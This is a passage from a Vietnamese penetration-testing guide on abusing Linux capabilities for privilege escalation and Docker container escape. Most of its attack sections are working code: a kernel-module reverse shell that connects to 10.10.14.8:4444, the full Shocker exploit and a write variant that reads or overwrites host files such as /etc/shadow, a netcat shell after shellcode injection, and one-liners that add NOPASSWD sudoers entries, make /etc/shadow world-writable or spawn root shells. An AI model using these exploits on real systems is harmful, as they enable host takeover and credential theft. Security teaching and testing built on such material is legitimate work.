Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

Liệt kê các **process** đang chạy trên **host** `ps -eaf`

1. Lấy **architecture** `uname -m`
2. Tìm **shellcode** phù hợp với architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Tìm **program** để **inject** **shellcode** vào bộ nhớ của một process ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Chỉnh sửa** **shellcode** trong program rồi **compile** `gcc inject.c -o inject`
5. **Inject** và lấy **shell** của bạn: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** cho phép process **load và unload kernel module (các system call `init_module(2)`, `finit_module(2)` và `delete_module(2))`**, qua đó cung cấp quyền truy cập trực tiếp vào các hoạt động cốt lõi của kernel. Capability này gây ra rủi ro bảo mật nghiêm trọng vì việc load module có thể thay đổi hành vi của kernel và phá vỡ các ranh giới cô lập.<sup>[[6]](#references)[[14]](#references)</sup>
Trong một Linux container rootful thông thường, thao tác này nhắm vào **kernel dùng chung của host**, do đó có thể trực tiếp thoát khỏi container. Capability phải có hiệu lực trong user namespace ban đầu vì việc load module không được namespace hóa. Runtime sử dụng userspace-kernel hoặc cô lập bằng VM như gVisor, Kata hay Hyper-V sẽ thay đổi ranh giới kernel có thể tiếp cận. Việc load module vẫn có thể bị chặn bởi `modules_disabled`, kernel lockdown, cơ chế thực thi chữ ký, seccomp hoặc LSM.<sup>[[14]](#references)</sup>

**Ví dụ với tệp nhị phân**

Trong ví dụ sau, tệp nhị phân **`python`** có capability này.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

Theo mặc định, lệnh **`modprobe`** kiểm tra các tệp danh sách dependency và map trong thư mục **`/lib/modules/$(uname -r)`**.\
Để khai thác điều này, hãy tạo một thư mục **lib/modules** giả:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Sau đó, **biên dịch kernel module mà bạn có thể tìm thấy trong 2 ví dụ bên dưới và sao chép** nó vào thư mục này:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Cuối cùng, hãy thực thi đoạn mã Python cần thiết để nạp kernel module này:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Ví dụ 2 với binary**

Trong ví dụ sau, binary **`kmod`** có capability này.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Điều đó có nghĩa là có thể dùng lệnh **`insmod`** để nạp một kernel module. Hãy làm theo ví dụ bên dưới để lấy **reverse shell** bằng cách lạm dụng quyền này.

**Ví dụ với environment (Docker breakout)**

Bạn có thể kiểm tra các capability được bật bên trong docker container bằng cách dùng:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Trong kết quả trước đó, bạn có thể thấy capability **SYS_MODULE** được bật.<sup>[[14]](#references)</sup>

**Tạo** **kernel module** sẽ thực thi một reverse shell và **Makefile** để **compile** nó:

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> Ký tự trống trước mỗi từ make trong Makefile **phải là tab, không phải dấu cách**!

Chạy `make` để biên dịch.

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Cuối cùng, khởi chạy `nc` trong một shell, rồi **load module** từ một shell khác; bạn sẽ bắt được shell trong tiến trình `nc`:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**Mã của kỹ thuật này được sao chép từ phòng thí nghiệm "Abusing SYS_MODULE Capability" của** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Có thể tìm thấy một ví dụ khác về kỹ thuật này tại [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) cho phép một tiến trình **bỏ qua quyền đọc tệp và quyền đọc, thực thi thư mục**. Capability này cũng cho phép gọi `open_by_handle_at(2)`, hàm diễn giải một file handle hợp lệ dựa trên file descriptor của mount thuộc cùng filesystem đã được mount. Nó không tự động làm lộ mọi tệp bên ngoài mount namespace của tiến trình. Để thoát khỏi giới hạn bằng file handle, còn cần một tham chiếu filesystem phù hợp với host, các handle hợp lệ hoặc có thể tìm thấy, filesystem và bố cục lưu trữ tương thích, đồng thời không bị runtime hay LSM chặn. Kỹ thuật "Shocker" lịch sử của Docker đã minh họa sự kết hợp này trong một số bố cục bị ảnh hưởng, như phân tích [tại đây](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**Điều này có nghĩa là bạn có thể bỏ qua các bước kiểm tra quyền đọc tệp và quyền đọc/thực thi thư mục**.<sup>[[14]](#references)</sup>

Đối với **custom executable** có capability này, hãy kiểm tra dữ liệu mà nó đọc và trả về cho bên gọi. Một công cụ quét tệp chấp nhận đường dẫn tệp được bảo vệ do bên gọi chọn và độ dài tiền tố do bên gọi chọn, sau đó tiết lộ digest đầy đủ của tiền tố đó, có thể hoạt động như một oracle đọc tệp: sau khi khôi phục `n-1` byte đầu tiên, hãy so sánh digest của các byte tiếp theo có thể có với digest mà công cụ trả về khi dùng độ dài `n`. Cách này không phụ thuộc vào việc tìm ra va chạm mật mã hay cụ thể là MD5; nó phụ thuộc vào các truy vấn lặp lại với độ dài được chọn và digest hiển thị, mang tính xác định. Digest của toàn bộ tệp mà không thể kiểm soát tiền tố không chứng minh được khả năng tương tự. Hãy xác nhận rằng bên gọi có thể thực thi công cụ, file capability của nó có hiệu lực, đường dẫn được chọn có thể truy cập trong mount namespace của nó, và hành vi đầu vào/đầu ra thực sự tồn tại. Đừng chạy một privileged helper không rõ nguồn gốc chỉ để kiểm tra trong quá trình liệt kê thụ động.

**Ví dụ với binary**

Binary có thể đọc các tệp truy cập được trong các namespace của nó. Vì vậy, nếu một tệp như `tar` có capability này, nó có thể đọc tệp shadow:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**Ví dụ với binary2**

Trong trường hợp này, giả sử binary **`python`** có capability này. Để liệt kê các tệp trong thư mục root, bạn có thể chạy:

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

Và để đọc một tệp, bạn có thể làm như sau:

```python
print(open("/etc/shadow", "r").read())
```

**Ví dụ trong môi trường (thoát khỏi Docker)**

Bạn có thể kiểm tra các capabilities được bật bên trong Docker container bằng `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Trong kết quả trước, bạn có thể thấy capability **DAC_READ_SEARCH** được bật. Capability này bỏ qua các kiểm tra DAC khi đọc/tìm kiếm và cho phép dùng `open_by_handle_at(2)`; bản thân nó không phải là capability dùng để debug tiến trình.<sup>[[14]](#references)</sup>

Bạn có thể tìm hiểu cách exploit sau hoạt động tại [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), nhưng tóm lại, **CAP_DAC_READ_SEARCH** cho phép duyệt hệ thống tệp mà không cần kiểm tra quyền và cho phép dùng `open_by_handle_at(2)`; điều này có thể làm lộ các tệp được tiến trình khác mở khi có thể truy cập các namespace và mount liên quan.<sup>[[13]](#references)[[14]](#references)</sup>

Exploit gốc lợi dụng các quyền này để đọc tệp từ host có thể tìm thấy tại đây: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); sau đây là **phiên bản đã sửa đổi, cho phép bạn truyền tệp cần đọc làm đối số đầu tiên và ghi kết quả vào một tệp**.<sup>[[12]](#references)</sup>

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> Exploit cần tìm một con trỏ đến thứ gì đó được mount trên host. Exploit gốc sử dụng file /.dockerinit, còn phiên bản đã chỉnh sửa này sử dụng /etc/hostname. Nếu exploit không hoạt động, có thể bạn cần đặt một file khác. Để tìm file được mount trên host, chỉ cần chạy lệnh mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit cần tìm một con trỏ đến thứ gì đó được mount trên host. Exploit gốc sử dụng file /.dockerinit, còn phiên bản đã chỉnh sửa này sử dụng...](<../../images/image (407) (1).png>)

**Code của kỹ thuật này được sao chép từ phòng lab "Abusing DAC_READ_SEARCH Capability" của** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Capability này bỏ qua các bước kiểm tra quyền đọc và ghi file, cùng với hầu hết các bước kiểm tra quyền thực thi**; để thực thi một file thông thường, vẫn cần có ít nhất một bit thực thi được đặt. Nó không vô hiệu hóa mount chỉ đọc, trạng thái bất biến hoặc việc LSM từ chối truy cập.<sup>[[14]](#references)</sup>

Tìm các file có thể đọc hoặc ghi được nhờ tư cách thành viên của một nhóm đặc quyền; mục tiêu hữu ích tùy thuộc vào chủ sở hữu và các bit quyền của mục tiêu.<sup>[[14]](#references)</sup>

**Ví dụ với binary**

Trong ví dụ này, vim có capability này, vì vậy bạn có thể chỉnh sửa bất kỳ file nào như _passwd_, _sudoers_ hoặc _shadow_:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**Ví dụ với binary 2**

Trong ví dụ này, binary **`python`** sẽ có capability này. Bạn có thể dùng python để ghi đè bất kỳ tệp nào:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**Ví dụ với environment + CAP_DAC_READ_SEARCH (Docker breakout)**

`CAP_DAC_READ_SEARCH` cho phép dùng `open_by_handle_at(2)`, nhưng **không** bỏ qua các kiểm tra quyền ghi. Để ghi thông qua handle đã được phân giải, tiến trình còn cần quyền truy cập ghi theo effective filesystem UID/GID hoặc ACL, hoặc cần `CAP_DAC_OVERRIDE`. Tham chiếu filesystem liên quan đến host, các file handle được hỗ trợ, mount có thể ghi và chính sách runtime/LSM cũng phải cho phép thao tác này. Kiểm tra effective capabilities và danh tính; chỉ riêng capability không chứng minh được rằng có thể ghi vào mục tiêu trên host. Xem [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) và [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html).<sup>[[14]](#references)[[26]](#references)</sup>

Trước hết, hãy đọc phần trước về [**abuses DAC_READ_SEARCH capability to read arbitrary files**](linux-capabilities.md#cap_dac_read_search) trên host và **biên dịch** exploit.\
Mẫu lịch sử sau cố gắng mở một file đã được phân giải bằng `O_RDWR`; thao tác chỉ thành công khi các điều kiện về filesystem và quyền ghi nêu trên được đáp ứng:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

Để **thoát** khỏi Docker container, bạn có thể **tải xuống** các tệp `/etc/shadow` và `/etc/passwd` từ host, **thêm** một **user mới** vào chúng, rồi dùng **`shocker_write`** để ghi đè chúng. Sau đó, **truy cập** qua **ssh**.

**Code của kỹ thuật này được sao chép từ phòng lab "Abusing DAC_OVERRIDE Capability" của** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Capability này cho phép một process thay đổi quyền sở hữu các tệp**.<sup>[[14]](#references)</sup>

**Ví dụ với binary**

Giả sử binary **`python`** có capability này; bạn có thể thay đổi chủ sở hữu của một tệp như **`shadow`**, sau đó tận dụng quyền truy cập có được để chỉnh sửa tệp nếu các quyền khác cho phép:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Hoặc với binary **`ruby`** có capability này:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**Capability này bỏ qua các kiểm tra quyền sở hữu đối với nhiều thao tác trên tệp, bao gồm cả việc thay đổi quyền**.<sup>[[14]](#references)</sup>

**Ví dụ với binary**

Nếu python có capability này, bạn có thể sửa quyền của tệp shadow, **thay đổi mật khẩu root** và leo thang đặc quyền:

```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```

### CAP_SETUID

**Capability này cho phép một process thay đổi user ID hiệu lực của nó, tùy thuộc vào các quy tắc về thông tin xác thực và capability do kernel thực thi**.<sup>[[14]](#references)</sup>

**Ví dụ với binary**

Nếu python có **capability** này, bạn có thể dễ dàng lạm dụng nó để leo thang đặc quyền lên root:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Một cách khác:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

Đối với một executable **custom** có `CAP_SETUID` hiệu lực, hãy kiểm tra code path có thể tiếp cận thay vì cho rằng chỉ riêng capability này đã cấp quyền chạy shell. Văn bản do caller kiểm soát được truyền làm *format string* cho [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html) có thể làm lộ hoặc thay đổi bộ nhớ của process; để chuyển quyền thành công vẫn cần có lời gọi dễ bị khai thác, input có thể kiểm soát và một hành động tiếp theo sau `setuid(0)`. Nếu hành động đó khởi chạy một helper bên ngoài bằng tên, hãy xác minh danh tính hiệu lực tại thời điểm khởi chạy, `PATH` thực tế và liệu caller có thể ghi và truy cập một thư mục được tìm kiếm trước đó hay không. File capability không hiệu lực, `no_new_privs`, đường dẫn helper cố định và đáng tin cậy hoặc một nhánh không thể tiếp cận đều làm thay đổi kết quả. Hãy kiểm tra binary hoặc source có sẵn khi offline; không gọi một privileged helper đáng ngờ trong quá trình liệt kê thông thường.

## CAP_SETGID

**Capability này cho phép một process thay đổi group ID hiệu lực, tùy thuộc vào các quy tắc về credentials và capability do kernel thực thi**.<sup>[[14]](#references)</sup>

Có rất nhiều file bạn có thể **ghi đè để leo thang đặc quyền,** [**bạn có thể tham khảo ý tưởng tại đây**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Ví dụ với binary**

Trong trường hợp này, bạn nên tìm các file thú vị mà một group có thể đọc vì bạn có thể giả danh bất kỳ group nào:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Sau khi tìm được một tệp có thể khai thác (thông qua đọc hoặc ghi) để leo thang đặc quyền, bạn có thể **lấy shell với danh tính của nhóm đáng chú ý** bằng cách:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

Trong trường hợp này, nhóm shadow đã bị giả mạo, vì vậy bạn có thể đọc tệp `/etc/shadow`:

```bash
cat /etc/shadow
```

### Chuỗi kết hợp: CAP_SETGID + CAP_CHOWN

Khi có cả hai capability trong cùng một helper, một chuỗi thực tế là:

1. Chuyển EGID sang `shadow` (hoặc một group có đặc quyền khác).
2. Dùng `chown` trên `/etc/shadow` để đặt UID của bạn, đồng thời giữ group là `shadow`.
3. Đọc hash mục tiêu rồi crack/pivot.

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

Điều này giúp tránh cần trực tiếp có toàn quyền root và thường là đủ để pivot thông qua việc tái sử dụng thông tin xác thực.

Nếu đã cài **docker**, bạn có thể **giả mạo** nhóm **docker** và lạm dụng nhóm này để giao tiếp với [**docker socket** và leo thang đặc quyền](#writable-docker-socket).

## CAP_SETFCAP

**Capability này cho phép một tiến trình thiết lập file capability**.<sup>[[14]](#references)</sup>

**Ví dụ với binary**

Nếu python có **capability** này, bạn có thể rất dễ lạm dụng nó để leo thang đặc quyền lên root:

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> Một capability set mới được ghi vào file sẽ thay thế set trước đó; nếu sau đó helper chỉ được thực thi với các capability mới, nó có thể không còn giữ `CAP_SETFCAP` để cập nhật file khác.<sup>[[14]](#references)[[25]](#references)</sup>

Sau khi có [SETUID capability](linux-capabilities.md#cap_setuid), bạn có thể xem phần tương ứng để biết cách leo thang đặc quyền.

**Ví dụ với environment (Docker breakout)**

Capability set mặc định được Docker ghi lại có **CAP_SETFCAP**, nhưng set thực tế phụ thuộc vào cấu hình runtime.<sup>[[19]](#references)</sup>
Bạn có thể kiểm tra các capability của process bằng lệnh:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

Capability này cho phép ghi các capability của tệp, nhưng bản thân nó không cấp các capability đó cho tiến trình hiện tại hoặc vượt qua các quy tắc về tệp, bounding set và namespace được áp dụng khi tệp được thực thi.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

Các capability được phép của tệp bị giới hạn bởi capability bounding set của tiến trình, còn bit effective của tệp quyết định liệu tập capability được phép của tệp có được đưa vào tập effective của tiến trình hay không. Vì vậy, việc thêm capability vào tệp không tự động khiến mọi capability được yêu cầu đều có thể sử dụng khi thực thi.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

